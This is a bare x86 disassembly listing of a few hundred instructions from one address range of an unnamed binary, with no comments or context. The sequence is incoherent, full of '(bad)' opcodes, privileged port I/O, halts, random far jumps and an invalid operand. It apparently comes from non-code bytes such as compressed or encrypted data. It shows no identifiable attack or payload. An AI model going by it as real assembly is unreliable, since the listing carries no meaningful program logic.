  41dae2:	mov    dh,0x5c
  41dae4:	mov    bh,BYTE PTR [edx-0x77]
  41dae7:	xchg   ebx,eax
  41dae8:	(bad)  
  41dae9:	fisub  WORD PTR [edi+0x15]
  41daec:	aad    0x57
  41daee:	push   ebx
  41daef:	rcr    BYTE PTR [ecx],cl
  41daf1:	xor    edi,0xffffff94
  41daf4:	ret    
  41daf5:	add    ch,cl
  41daf7:	ins    BYTE PTR es:[edi],dx
  41daf8:	js     0x41dac9
  41dafa:	loope  0x41db16
  41dafc:	dec    edx
  41dafd:	jl     0x41da9e
  41daff:	shl    edx,cl
  41db01:	cmp    BYTE PTR [edx],bl
  41db03:	cmp    cl,BYTE PTR [esi]
  41db05:	lods   al,BYTE PTR ds:[esi]
  41db06:	sbb    esi,0xffffffaf
  41db09:	jl     0x41db60
  41db0b:	dec    eax
  41db0c:	sub    BYTE PTR [eax],ah
  41db0e:	add    al,0xa0
  41db10:	dec    edi
  41db11:	xor    DWORD PTR [ebx+0xf],ecx
  41db14:	jo     0x41db54
  41db16:	and    al,0xca
  41db18:	xchg   DWORD PTR [ebx],esp
  41db1a:	push   0xffffff80
  41db1c:	adc    ebp,DWORD PTR [edi-0x11]
  41db1f:	mov    ds:0xacbf964d,eax
  41db24:	and    ebp,DWORD PTR [ecx]
  41db26:	push   ebx
  41db27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db28:	or     esi,ebx
  41db2a:	repnz lods al,BYTE PTR ds:[esi]
  41db2c:	mov    bl,0x19
  41db2e:	out    0x1c,eax
  41db30:	popa   
  41db31:	mov    dl,0xa7
  41db33:	clc    
  41db34:	ret    
  41db35:	or     ch,BYTE PTR [edi+edx*2+0xebed830]
  41db3c:	mov    eax,0xb0e5f492
  41db41:	or     DWORD PTR [edx-0x5d1a01e4],ebp
  41db47:	fs fs jle 0x41db99
  41db4b:	adc    al,0x1f
  41db4d:	mov    dh,0x3d
  41db4f:	push   es
  41db50:	fwait
  41db51:	rcr    DWORD PTR [ecx+0x3a],0x8c
  41db55:	ja     0x41db0b
  41db57:	clc    
  41db58:	nop
  41db59:	mov    esp,0x314c2883
  41db5e:	inc    eax
  41db5f:	out    dx,eax
  41db60:	jge    0x41dbc4
  41db62:	fadd   QWORD PTR [edx+0x7c]
  41db65:	bound  ecx,QWORD PTR [edx-0x2c884670]
  41db6b:	int3   
  41db6c:	nop
  41db6d:	outs   dx,DWORD PTR ds:[esi]
  41db6e:	xlat   BYTE PTR ds:[ebx]
  41db6f:	and    eax,0x40a8fa05
  41db74:	pushf  
  41db75:	jecxz  0x41dbbb
  41db77:	and    eax,0x75969529
  41db7c:	dec    ebp
  41db7d:	pusha  
  41db7e:	cmp    ah,BYTE PTR [ebx-0x62cfe0ff]
  41db84:	xchg   bl,ch
  41db86:	test   eax,0x8cec785d
  41db8b:	sub    dh,dh
  41db8d:	test   al,0xf6
  41db8f:	lods   al,BYTE PTR ds:[esi]
  41db90:	jmp    0x88b7:0xc518758e
  41db97:	popf   
  41db98:	sub    BYTE PTR [ebp+0x74],dh
  41db9b:	push   0x87528267
  41dba0:	or     DWORD PTR [edx+ecx*4+0x32fd32f5],ecx
  41dba7:	xchg   esi,eax
  41dba8:	dec    esp
  41dba9:	mov    ah,0x1a
  41dbab:	daa    
  41dbac:	adc    DWORD PTR [ebp+0x6],edx
  41dbaf:	das    
  41dbb0:	jl     0x41dbcd
  41dbb2:	sbb    al,0x53
  41dbb4:	and    dl,BYTE PTR [ebp-0x245ada85]
  41dbba:	cld    
  41dbbb:	add    eax,0x3f7a1796
  41dbc0:	xchg   esp,eax
  41dbc1:	cmc    
  41dbc2:	hlt    
  41dbc3:	shl    DWORD PTR [bp+0x5d65],0x7b
  41dbc9:	into   
  41dbca:	xor    al,0xb7
  41dbcc:	dec    edx
  41dbcd:	cli    
  41dbce:	xlat   BYTE PTR ds:[ebx]
  41dbcf:	or     eax,0x2e041792
  41dbd4:	jbe    0x41dc24
  41dbd6:	sbb    eax,0xf2075239
  41dbdb:	jp     0x41dbb1
  41dbdd:	daa    
  41dbde:	hlt    
  41dbdf:	call   0x4cf3746f
  41dbe4:	sbb    ch,BYTE PTR [eax]
  41dbe6:	dec    edi
  41dbe7:	rol    DWORD PTR [ebx+eiz*2-0x29],cl
  41dbeb:	add    al,0x4
  41dbed:	xor    eax,0x1b95a229
  41dbf2:	adc    bl,BYTE PTR [esi+0x32d07868]
  41dbf8:	in     eax,0x37
  41dbfa:	fsubr  st,st(0)
  41dbfc:	mov    esp,edx
  41dbfe:	sti    
  41dbff:	shl    eax,1
  41dc01:	ret    0x3154
  41dc04:	lods   eax,DWORD PTR ds:[esi]
  41dc05:	xchg   edx,eax
  41dc06:	add    eax,0x35c38799
  41dc0b:	push   0x7390c6c2
  41dc10:	xchg   ebx,eax
  41dc11:	mov    DWORD PTR [esi],esi
  41dc13:	push   ebp
  41dc14:	xchg   al,cl
  41dc16:	mov    ds:0xedf95f1,al
  41dc1b:	fcmovnu st,st(2)
  41dc1d:	out    dx,eax
  41dc1e:	inc    ebp
  41dc1f:	pop    esi
  41dc20:	add    dh,BYTE PTR [esi]
  41dc22:	aad    0x41
  41dc24:	pop    ss
  41dc25:	stc    
  41dc26:	jmp    0x6871:0x2e29913b
  41dc2d:	imul   edx,DWORD PTR [eax+ebx*4+0x39],0xffffffd5
  41dc32:	hlt    
  41dc33:	sahf   
  41dc34:	ss inc edx
  41dc36:	ins    DWORD PTR es:[edi],dx
  41dc37:	out    dx,eax
  41dc38:	cwde   
  41dc39:	mov    esi,0x1a9e4f0
  41dc3e:	lea    esi,[edx+0x402abe3e]
  41dc44:	outs   dx,BYTE PTR ds:[esi]
  41dc45:	imul   edx,DWORD PTR [ecx],0xffffffb8
  41dc48:	jle    0x41dc34
  41dc4a:	mov    dh,0x6f
  41dc4c:	mov    edx,0x58f1b17
  41dc51:	xchg   ebx,eax
  41dc52:	fadd   DWORD PTR [edi+0x4118b612]
  41dc58:	xchg   DWORD PTR [esi-0x582f1806],edi
  41dc5e:	lds    ebp,FWORD PTR [edx]
  41dc60:	and    DWORD PTR [esi],edi
  41dc62:	xlat   BYTE PTR ds:[ebx]
  41dc63:	pop    eax
  41dc64:	frstor [edx+0x173a9b7a]
  41dc6a:	push   cs
  41dc6b:	push   ebx
  41dc6c:	add    DWORD PTR [edx+0x675cc421],edi
  41dc72:	push   0xffffffa9
  41dc74:	mov    eax,ds:0x1f568060
  41dc79:	fwait
  41dc7a:	pop    edx
  41dc7b:	jb     0x41dc1c
  41dc7d:	push   edx
  41dc7e:	mov    ebx,0x1c4e6ce0
  41dc83:	mov    ah,ah
  41dc85:	dec    esi
  41dc86:	sub    eax,0xcbb07bcd
  41dc8b:	add    al,0x86
  41dc8d:	mov    WORD PTR [ecx],ds
  41dc8f:	out    dx,eax
  41dc90:	inc    esp
  41dc91:	ss sub bl,dl
  41dc94:	test   DWORD PTR [ecx+0x0],ebx
  41dc97:	push   edx
  41dc98:	aad    0x3e
  41dc9a:	mov    dh,BYTE PTR [eax+edx*1]
  41dc9d:	inc    edx
  41dc9e:	xchg   ebx,eax
  41dc9f:	add    dh,bh
  41dca1:	scas   eax,DWORD PTR es:[edi]
  41dca2:	xor    al,0xb3
  41dca4:	mov    ah,0xe0
  41dca6:	mov    bl,0xaf
  41dca8:	adc    eax,eax
  41dcaa:	push   es
  41dcab:	sub    DWORD PTR [ebp-0x4d],ebx
  41dcae:	hlt    
  41dcaf:	jmp    0x237cd3f0
  41dcb4:	inc    ebp
  41dcb5:	sbb    cl,BYTE PTR [ecx-0x7b55573b]
  41dcbb:	shl    DWORD PTR [ecx],cl
  41dcbd:	imul   esp,DWORD PTR [ebx-0x195e8919],0x70e89940
  41dcc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcc8:	dec    ebx
  41dcc9:	xor    dh,BYTE PTR [ebp+0x27bce620]
  41dccf:	jbe    0x41dcd8
  41dcd1:	hlt    
  41dcd2:	in     al,dx
  41dcd3:	jmp    0x6bb:0x94a0b563
  41dcda:	adc    BYTE PTR [eax],bh
  41dcdc:	push   0x48
  41dcde:	pop    edx
  41dcdf:	xor    ch,al
  41dce1:	xchg   edi,eax
  41dce2:	pop    esi
  41dce3:	retf   0x39b5
  41dce6:	jne    0x41dc77
  41dce8:	cmovs  edx,DWORD PTR [eax]
  41dceb:	sbb    eax,0x7634cad5
  41dcf0:	sbb    eax,ebp
  41dcf2:	inc    eax
  41dcf3:	aam    0xef
  41dcf5:	fwait
  41dcf6:	in     eax,dx
  41dcf7:	test   eax,0x8006a05b
  41dcfc:	jne    0x41dd64
  41dcfe:	jb     0x41dd62
  41dd00:	push   ss
  41dd01:	(bad)  
  41dd02:	popa   
  41dd03:	mov    ebx,0x735347e5
  41dd08:	or     esp,esp
  41dd0a:	sub    dl,BYTE PTR [ebp-0x73839f0e]
  41dd10:	inc    ebp
  41dd11:	xor    al,0xa
  41dd13:	adc    al,0x25
  41dd15:	xchg   edx,eax
  41dd16:	repz jb 0x41dcb3
  41dd19:	jl     0x41dca9
  41dd1b:	fldenv [ebp+0x1d]
  41dd1e:	es sti 
  41dd20:	sub    eax,0x6d3437f0
  41dd25:	xchg   ebx,eax
  41dd26:	sti    
  41dd27:	cmp    eax,DWORD PTR [esi+ebp*4-0x34]
  41dd2b:	jg     0x41dd8c
  41dd2d:	rol    DWORD PTR [eax-0x7c],0x11
  41dd31:	bnd jns 0x41dd5d
  41dd34:	out    dx,eax
  41dd35:	adc    DWORD PTR [edi],edi
  41dd37:	or     DWORD PTR ds:0xa4daf355,edi
  41dd3d:	mov    ebp,0x8916036b
  41dd42:	pop    eax
  41dd43:	push   esi
  41dd44:	push   ds
  41dd45:	ror    DWORD PTR [edx+0x39],cl
  41dd48:	mov    esi,ebp
  41dd4a:	ror    BYTE PTR [esi],0x54
  41dd4d:	jne    0x41dd7d
  41dd4f:	dec    esp
  41dd50:	ficom  WORD PTR [esi+0x77]
  41dd53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd54:	cs hlt 
  41dd56:	push   ebp
  41dd57:	adc    dl,BYTE PTR [ebx-0x41d4407a]
  41dd5d:	enter  0xaadf,0xbf
  41dd61:	xor    DWORD PTR [edx],edi
  41dd63:	je     0x41dd9f
  41dd65:	push   esp
  41dd66:	fdivr  DWORD PTR [ecx+0x520bdecc]
  41dd6c:	call   0x5536:0x9a0abd9
  41dd73:	sub    ch,BYTE PTR [eax+0x1eaa61f5]
  41dd79:	add    eax,DWORD PTR es:[esi]
  41dd7c:	xchg   edx,eax
  41dd7d:	mov    ds:0x23d62af9,eax
  41dd82:	sahf   
  41dd83:	(bad)  
  41dd84:	popa   
  41dd85:	mov    al,0x78
  41dd87:	mov    eax,0x53b0ca86
  41dd8c:	xchg   BYTE PTR [ecx+0x7d],cl
  41dd8f:	scas   al,BYTE PTR es:[edi]
  41dd90:	les    edx,FWORD PTR gs:[ebx]
  41dd93:	imul   ch
  41dd95:	into   
  41dd96:	push   es
  41dd97:	das    
  41dd98:	adc    BYTE PTR [edx],0x92
  41dd9b:	test   BYTE PTR [ebx+ebp*8+0x1],cl
  41dd9f:	(bad)  
  41dda0:	mov    al,ds:0xb7080dc3
  41dda5:	pop    edi
  41dda6:	and    BYTE PTR [ecx],bl
  41dda8:	jmp    0x58aa:0xa87709b9
  41ddaf:	xchg   ebx,eax
  41ddb0:	xchg   esi,eax
  41ddb1:	ret    
  41ddb2:	fdivr  QWORD PTR [edi]
  41ddb4:	jg     0x41ddfe
  41ddb6:	xor    esp,edx
  41ddb8:	inc    ecx
  41ddb9:	outs   dx,DWORD PTR ds:[esi]
  41ddba:	fwait
  41ddbb:	repz aad 0x33
  41ddbe:	jno    0x41dda1
  41ddc0:	sahf   
  41ddc1:	xchg   ecx,eax
  41ddc2:	test   bh,0xb7
  41ddc5:	mov    fs,WORD PTR [ebx+0x28f71c72]
  41ddcb:	inc    ecx
  41ddcc:	push   ss
  41ddcd:	inc    eax
  41ddce:	mov    eax,ds:0xbd432ed6
  41ddd3:	push   es
  41ddd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddd5:	add    ebx,DWORD PTR [edx+0x68]
  41ddd8:	sub    eax,esi
  41ddda:	dec    ebp
  41dddb:	loop   0x41ddbe
  41dddd:	or     eax,0x8d92dce5
  41dde2:	pop    ebx
  41dde3:	frstor [ecx+0x43a1821c]
  41dde9:	mov    bh,0xe5
  41ddeb:	aam    0xa1
  41dded:	aam    0x45
  41ddef:	inc    esi
  41ddf0:	dec    ecx
  41ddf1:	xchg   DWORD PTR [ecx+0x329cf69],ebx
  41ddf7:	xchg   ecx,eax
  41ddf8:	popf   
  41ddf9:	add    al,0x12
  41ddfb:	mov    bl,0x7f
  41ddfd:	aad    0x24
  41ddff:	pop    ecx
  41de00:	mov    eax,ds:0x1fea4a84
  41de05:	mov    esi,0x219e0cf7
  41de0a:	lods   al,BYTE PTR ds:[esi]
  41de0b:	push   ss
  41de0c:	packuswb mm6,QWORD PTR [esi]
  41de0f:	dec    ebp
  41de10:	jle    0x41ddad
  41de12:	rep lods eax,DWORD PTR ds:[esi]
  41de14:	loopne 0x41de4c
  41de16:	xchg   ecx,eax
  41de17:	into   
  41de18:	out    0xe3,eax
  41de1a:	push   0x22
  41de1c:	or     DWORD PTR [esi+ecx*8+0x32],esp
  41de20:	cmc    
  41de21:	les    eax,FWORD PTR [edx-0xa]
  41de24:	push   cs
  41de25:	sti    
  41de26:	or     edi,ecx
  41de28:	mov    al,ds:0x17028978
  41de2d:	jmp    0xc7a92ed4
  41de32:	jecxz  0x41de48
  41de34:	sbb    BYTE PTR [ebx+ecx*2+0x44c31647],bh
  41de3b:	sahf   
  41de3c:	ins    DWORD PTR es:[edi],dx
  41de3d:	lods   al,BYTE PTR ds:[esi]
  41de3e:	test   BYTE PTR [edi+ecx*2-0x4cf56fd2],dh
  41de45:	daa    
  41de46:	push   ds
  41de47:	adc    al,0xc6
  41de49:	lods   eax,DWORD PTR ds:[esi]
  41de4a:	vpsignb ymm5,ymm3,YMMWORD PTR ds:[edx]
  41de50:	inc    ebp
  41de51:	xchg   ecx,edx
  41de53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de54:	les    edx,FWORD PTR [eax-0x5a1ae562]
  41de5a:	popa   
  41de5b:	je     0x41de22
  41de5d:	imul   ebx,DWORD PTR [esi],0x7e
  41de60:	add    al,0xe2
  41de62:	imul   ecx,ebx,0xa
  41de65:	popa   
  41de66:	mov    al,0xc5
  41de68:	push   edi
  41de69:	shl    BYTE PTR [eax],cl
  41de6b:	xchg   ebp,eax
  41de6c:	jbe    0x41de02
  41de6e:	and    eax,0x3b07440e
  41de73:	jo     0x41de8d
  41de75:	jns    0x41de8a
  41de77:	cmp    dl,BYTE PTR [ebp+0x2acd4229]
  41de7d:	(bad)  
  41de7e:	cmp    DWORD PTR [eax-0x344bc670],0xf074efc6
  41de88:	push   ebp
  41de89:	mov    edx,0xf865a9b2
  41de8e:	aad    0xe0
  41de90:	xchg   edi,ebx
  41de92:	or     ecx,DWORD PTR [esi-0x241db342]
  41de98:	sbb    BYTE PTR cs:0xafbc6062,0x94
  41dea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dea1:	dec    ebx
  41dea2:	ror    BYTE PTR [eax],cl
  41dea4:	cmp    ecx,DWORD PTR [edx-0x4a4368ea]
  41deaa:	push   ecx
  41deab:	cmc    
  41deac:	int3   
  41dead:	xchg   edi,eax
  41deae:	pop    edi
  41deaf:	lods   al,BYTE PTR ds:[esi]
  41deb0:	jo     0x41de8d
  41deb2:	mov    dh,0xb9
  41deb4:	aad    0x85
  41deb6:	push   edx
  41deb7:	mov    bh,0xf
  41deb9:	imul   edx,DWORD PTR [ebx+0x40],0xffffffc9
  41debd:	pop    ebx
  41debe:	add    bl,BYTE PTR ds:0xddb7a225
  41dec4:	mov    al,ds:0xa368f1bc
  41dec9:	push   DWORD PTR [edx-0x44]
  41decc:	popa   
  41decd:	icebp  
  41dece:	inc    ebp
  41decf:	adc    edi,ebp
  41ded1:	jp     0x41de7c
  41ded3:	pop    ds
  41ded4:	(bad)  
  41ded5:	in     al,0x18
  41ded7:	in     al,0x0
  41ded9:	retf   0xb0bd
  41dedc:	loope  0x41ded1
  41dede:	or     eax,0xdaa2e5b0
  41dee3:	rcl    DWORD PTR [ebx],0x32
  41dee6:	cmp    BYTE PTR ds:0x19f85320,bl
  41deec:	dec    esi
  41deed:	cmp    esp,DWORD PTR [esi-0x72f9b7b4]
  41def3:	dec    ebx
  41def4:	pop    ecx
  41def6:	sub    BYTE PTR [ebp+0x5f185f23],0xd4
  41defd:	cmc    
  41defe:	pop    ds
  41deff:	or     al,0xab
  41df01:	mov    eax,0xfd1ca006
  41df06:	push   ecx
  41df07:	push   ecx
  41df08:	mov    WORD PTR [edi-0x18ba45b0],ss
  41df0e:	aad    0x93
  41df10:	test   eax,0x19a25f43
  41df15:	inc    ecx
  41df16:	iret   
  41df17:	or     bh,al
  41df19:	sbb    bh,0x60
  41df1c:	fild   DWORD PTR [esi-0x10]
  41df1f:	sub    BYTE PTR [eax],ah
  41df21:	jle    0x41df6b
  41df23:	dec    edi
  41df24:	cmp    bl,dh
  41df26:	sub    eax,0xa57795c5
  41df2b:	sub    DWORD PTR [edx+0x47],eax
  41df2e:	lea    edx,[ebp+0x10cbf74e]
  41df34:	jns    0x41df03
  41df36:	das    
  41df37:	test   DWORD PTR [ebx+0x44],0xe79c024c
  41df3e:	sbb    eax,0x47a3ee07
  41df43:	jo     0x41dfa1
  41df45:	mov    esp,esp
  41df47:	fst    QWORD PTR [edi+eiz*4]
  41df4a:	inc    edi
  41df4b:	lea    esi,[eax+0x69]
  41df4e:	sub    esp,eax
  41df50:	push   ss
  41df51:	ret    0xadb
  41df54:	outs   dx,BYTE PTR ds:[esi]
  41df55:	dec    edx
  41df56:	nop
  41df57:	jmp    0x41df4c
  41df59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df5a:	push   esi
  41df5b:	nop    DWORD PTR [edx+0x13]
  41df5f:	jp     0x41df1e
  41df61:	cwde   
  41df62:	out    0x8e,eax
  41df64:	pusha  
  41df65:	mov    ebx,0x65b0572e
  41df6a:	mov    eax,ds:0xe1ea0a58
  41df6f:	cmp    ah,BYTE PTR [ebp+0x4c]
  41df72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df73:	scas   eax,DWORD PTR es:[edi]
  41df74:	jae    0x41def9
  41df76:	arpl   WORD PTR [edx],cx
  41df78:	shl    DWORD PTR [ebp+edi*2-0x5a],1
  41df7c:	aas    
  41df7d:	cmp    BYTE PTR [ebx+0x41],dh
  41df80:	in     al,0x2
  41df82:	nop
  41df83:	idiv   DWORD PTR [ecx+edx*2+0x402e74f4]
  41df8a:	rcr    BYTE PTR [eax+eax*2+0x587cc8f6],cl
  41df91:	sbb    DWORD PTR [esi+0xa9392f3],0x1
  41df98:	fldcw  WORD PTR fs:[ecx+0x1e]
  41df9c:	imul   edi,DWORD PTR [eax],0xb2a03497
  41dfa2:	(bad)  
  41dfa3:	test   al,0x60
  41dfa5:	out    dx,eax
  41dfa6:	pop    eax
  41dfa7:	sbb    ebp,DWORD PTR [eax+edi*8+0x68]
  41dfab:	xchg   esi,eax
  41dfac:	or     BYTE PTR [eax-0xc72e193],dh
  41dfb2:	and    eax,0xa6b35b46
  41dfb7:	lock mov al,0xde
  41dfba:	xchg   DWORD PTR [ecx+ecx*2],eax
  41dfbd:	fcom   QWORD PTR [esi-0x25ecc910]
  41dfc3:	and    edx,edi
  41dfc5:	arpl   bx,ax
  41dfc7:	jnp    0x41df7a
  41dfc9:	repnz cdq 
  41dfcb:	inc    edi
  41dfcc:	inc    edx
  41dfcd:	pushf  
  41dfce:	add    DWORD PTR [esi-0xb],0xffffffa7
  41dfd2:	adc    BYTE PTR [edx+0x5e],bl
  41dfd5:	int    0xc3
  41dfd7:	loope  0x41df5f
  41dfd9:	out    dx,eax
  41dfda:	ins    BYTE PTR es:[edi],dx
  41dfdb:	pop    ss
  41dfdc:	ror    BYTE PTR [ecx-0x12],0xf
  41dfe0:	push   es
  41dfe1:	or     ebx,esi
  41dfe3:	jne    0x41dfc3
  41dfe5:	mov    bl,BYTE PTR [ebx]
  41dfe7:	je     0x41df9f
  41dfe9:	iret   
  41dfea:	adc    ecx,DWORD PTR [edi]
  41dfec:	mov    cl,0x23
  41dfee:	int    0x23
  41dff0:	fdivrp st(4),st
  41dff2:	adc    DWORD PTR [edi],edi
  41dff4:	pop    ecx
  41dff5:	mov    bh,0x61
  41dff7:	sar    cl,cl
  41dff9:	adc    DWORD PTR [esi+0x28],eax
  41dffc:	jecxz  0x41dff1
  41dffe:	dec    ebp
  41dfff:	inc    ebp
  41e000:	sbb    eax,0xfafe1946
  41e005:	xchg   esp,ecx
  41e007:	xor    BYTE PTR [ebx+ecx*4+0x31],0xee
  41e00c:	gs pop esp
  41e00e:	push   eax
  41e00f:	test   al,0x93
  41e011:	stos   BYTE PTR es:[edi],al
  41e012:	shl    BYTE PTR [esi-0x489892f5],0xd4
  41e019:	cmp    DWORD PTR [esi-0x2b],edi
  41e01c:	or     bl,bh
  41e01e:	not    esp
  41e020:	dec    edi
  41e021:	push   esp
  41e022:	push   ecx
  41e023:	and    dh,BYTE PTR [eax-0x77]
  41e026:	add    DWORD PTR [esi-0x1d3d63ec],ebp
  41e02c:	push   ds
  41e02d:	iret   
  41e02e:	adc    BYTE PTR [ebx],al
  41e030:	xchg   dh,dh
  41e032:	data16 daa 
  41e034:	xor    al,0x8c
  41e036:	mov    esi,DWORD PTR [esi]
  41e038:	xor    ebx,DWORD PTR [esi]
  41e03a:	fs push edx
  41e03c:	cs mov eax,0x6def8548
  41e042:	scas   al,BYTE PTR es:[edi]
  41e043:	out    0x5f,al
  41e045:	pusha  
  41e046:	int3   
  41e047:	jmp    0x41e064
  41e049:	mov    ?,WORD PTR [ebp+0x47]
  41e04c:	rcr    DWORD PTR [esi],0x99
  41e04f:	dec    edx
  41e050:	jno    0x41e059
  41e052:	cmp    BYTE PTR [ebx+0x1c],cl
  41e055:	add    BYTE PTR [edx],ch
  41e057:	jle    0x41dfe9
  41e059:	sbb    ebx,DWORD PTR [ebp-0x77]
  41e05c:	pop    edi
  41e05d:	addr16 pop edx
  41e05f:	in     al,dx
  41e060:	iret   
  41e061:	(bad)  
  41e062:	sar    BYTE PTR [ecx],1
  41e064:	fwait
  41e065:	sub    ecx,DWORD PTR ds:0x52e1e04d
  41e06b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e06c:	loop   0x41e015
  41e06e:	pop    ds
  41e06f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e070:	mov    ebp,0xfd57a799
  41e075:	dec    edx
  41e076:	pop    ebp
  41e077:	test   dh,dh
  41e079:	test   al,0xb8
  41e07b:	dec    ebp
  41e07c:	inc    ecx
  41e07d:	pop    edx
  41e07e:	mov    dh,0x71
  41e080:	(bad)  
  41e081:	mul    BYTE PTR ds:0xe6660612
  41e087:	aad    0xf5
  41e089:	popa   
  41e08a:	lahf   
  41e08b:	add    al,bh
  41e08d:	mov    edx,0xfbdc302f
  41e092:	shl    BYTE PTR [esi+0x7f],0x5e
  41e096:	jae    0x41e024
  41e098:	add    al,0x8e
  41e09a:	mov    ebx,0x29a8198
  41e09f:	(bad)  
  41e0a0:	mov    ds:0x5e090599,al
  41e0a5:	in     al,0xc1
  41e0a7:	jp     0x41e0f2
  41e0a9:	lock mov esi,0x18485e8a
  41e0af:	push   esi
  41e0b0:	or     al,0x9e
  41e0b2:	pushf  
  41e0b3:	and    ch,BYTE PTR [ebx*1-0x603b9159]
  41e0ba:	bound  eax,QWORD PTR ds:0xc4fbb1f4
  41e0c0:	daa    
  41e0c1:	pop    es
  41e0c2:	add    DWORD PTR [ebx+0x63],ebp
  41e0c5:	push   edx
  41e0c6:	mov    esp,DWORD PTR [esi-0x4c3c3be5]
  41e0cc:	xlat   BYTE PTR ds:[ebx]
  41e0cd:	dec    edi
  41e0ce:	sti    
  41e0cf:	push   ds
  41e0d0:	int    0x30
  41e0d2:	into   
  41e0d3:	adc    edi,DWORD PTR [edi-0x963d779]
  41e0d9:	jmp    0x41e0e3
  41e0db:	idiv   DWORD PTR [ecx-0x5d]
  41e0de:	pop    eax
  41e0df:	pushf  
  41e0e0:	and    eax,DWORD PTR [ecx]
  41e0e2:	pop    edx
  41e0e3:	xchg   edi,eax
  41e0e4:	retf   0x56db
  41e0e7:	(bad)  
  41e0e8:	cmc    
  41e0e9:	cli    
  41e0ea:	mov    al,ch
  41e0ec:	dec    esi
  41e0ed:	mov    ebp,0xa759c088
  41e0f2:	and    al,0x8
  41e0f4:	mov    edx,fs
  41e0f6:	jge    0x41e151
  41e0f8:	mov    esi,0xbe59d3bf
  41e0fd:	adc    eax,0x6fca911
  41e102:	pop    ecx
  41e103:	aaa    
  41e104:	call   0xaabc:0x118275fc
  41e10b:	sbb    al,0x9b
  41e10d:	inc    esp
  41e10e:	loop   0x41e0c2
  41e110:	jecxz  0x41e0aa
  41e112:	out    0x24,eax
  41e114:	adc    eax,0xa342c824
  41e119:	ret    
  41e11a:	sbb    ch,BYTE PTR [ebx-0x3e0a8f77]
  41e120:	dec    esp
  41e121:	cmp    al,0xd4
  41e123:	cmp    DWORD PTR cs:[eax-0x5],eax
  41e127:	inc    ebp
  41e128:	push   ecx
  41e129:	js     0x41e17c
  41e12b:	in     al,0xc
  41e12d:	mov    al,0x29
  41e12f:	or     dl,BYTE PTR [edx-0x328e17e0]
  41e135:	add    ah,BYTE PTR [esi+0x4f3979e2]
  41e13b:	int    0xac
  41e13d:	shl    DWORD PTR [edx-0x1af507ff],1
  41e143:	imul   eax,esp,0xffffff9c
  41e146:	inc    ebp
  41e147:	mov    ah,0xe9
  41e149:	leave  
  41e14a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e14b:	js     0x41e1a1
  41e14d:	sti    
  41e14e:	xchg   esi,eax
  41e14f:	out    0xb,eax
  41e151:	je     0x41e1b4
  41e153:	(bad)  
  41e154:	lahf   
  41e155:	jmp    0x41e19f
  41e157:	xor    dh,BYTE PTR [eax]
  41e159:	push   0xffffffe7
  41e15b:	imul   edx,eax,0x6302cd2d
  41e161:	sbb    eax,0x58b70726
  41e166:	ret    0x99e7
  41e169:	mov    edx,0x2946772d
  41e16e:	out    0x3b,eax
  41e170:	daa    
  41e171:	or     al,0x2a
  41e173:	std    
  41e174:	fist   WORD PTR [esi+0x2fd458f1]
  41e17a:	daa    
  41e17b:	rol    esi,cl
  41e17d:	fs or  dh,dl
  41e180:	xchg   ebp,eax
  41e181:	loopne 0x41e107
  41e183:	imul   eax,DWORD PTR [edx+ebp*2+0x74],0x23
  41e188:	dec    ebx
  41e189:	mov    dl,0xe7
  41e18b:	ret    
  41e18c:	in     eax,0x6e
  41e18e:	ss dec edx
  41e190:	xchg   ebx,eax
  41e191:	arpl   WORD PTR [eax+0x69090d0c],sp
  41e197:	pop    edi
  41e198:	std    
  41e199:	lea    ebp,[edi-0x6fd18a6b]
  41e19f:	sbb    BYTE PTR [ebx+0x1db1990c],0x6
  41e1a6:	sbb    bh,BYTE PTR [ecx]
  41e1a8:	outs   dx,DWORD PTR ds:[esi]
  41e1a9:	int    0x25
  41e1ab:	loopne 0x41e175
  41e1ad:	fcmovnb st,st(2)
  41e1af:	jb     0x41e1a2
  41e1b1:	adc    cl,BYTE PTR [edx-0x30]
  41e1b4:	dec    ebp
  41e1b5:	cmp    bh,bh
  41e1b7:	jae    0x41e1ef
  41e1b9:	loopne 0x41e13b
  41e1bb:	mov    ah,0x30
  41e1bd:	or     DWORD PTR ds:0x9515e896,esi
  41e1c3:	jb     0x41e1a5
  41e1c5:	out    0x23,al
  41e1c7:	dec    esp
  41e1c8:	jp     0x41e21f
  41e1ca:	icebp  
  41e1cb:	push   ecx
  41e1cc:	cli    
  41e1cd:	push   edi
  41e1ce:	scas   eax,DWORD PTR es:[edi]
  41e1cf:	or     DWORD PTR [esi+0x6a],eax
  41e1d2:	fs xchg ecx,eax
  41e1d4:	mov    cl,0x9d
  41e1d6:	adc    edi,DWORD PTR [ebx+0x55]
  41e1d9:	or     dh,cl
  41e1db:	ds cmc 
  41e1dd:	fisttp QWORD PTR [ebp-0x40]
  41e1e0:	inc    edx
  41e1e1:	inc    ecx
  41e1e2:	push   0x2216e120
  41e1e7:	shl    DWORD PTR [edx],cl
  41e1e9:	xchg   ebp,eax
  41e1ea:	cmc    
  41e1eb:	bnd jnp 0x41e1e9
  41e1ee:	xor    BYTE PTR [ecx],0x3c
  41e1f1:	je     0x41e1c3
  41e1f3:	jo     0x41e1bb
  41e1f5:	dec    edi
  41e1f6:	cmp    eax,0xec686b7
  41e1fb:	das    
  41e1fc:	ja     0x41e252
  41e1fe:	lods   eax,DWORD PTR ds:[esi]
  41e1ff:	cmp    al,0x9
  41e201:	stos   BYTE PTR es:[edi],al
  41e202:	add    dl,BYTE PTR [edx+0x5a58d2a7]
  41e208:	mov    edx,0x6f18aacc
  41e20d:	add    DWORD PTR [ebx],ecx
  41e20f:	dec    esi
  41e210:	popa   
  41e211:	mov    ds:0xa835e280,al
  41e216:	ds aad 0xb0
  41e219:	jmp    0xc9d09aec
  41e21e:	dec    edi
  41e21f:	shl    BYTE PTR [ecx-0x7f309364],1
  41e225:	dec    eax
  41e226:	das    
  41e227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e228:	mov    edx,0xebbf514c
  41e22d:	sub    BYTE PTR [edx],dl
  41e22f:	jg     0x41e208
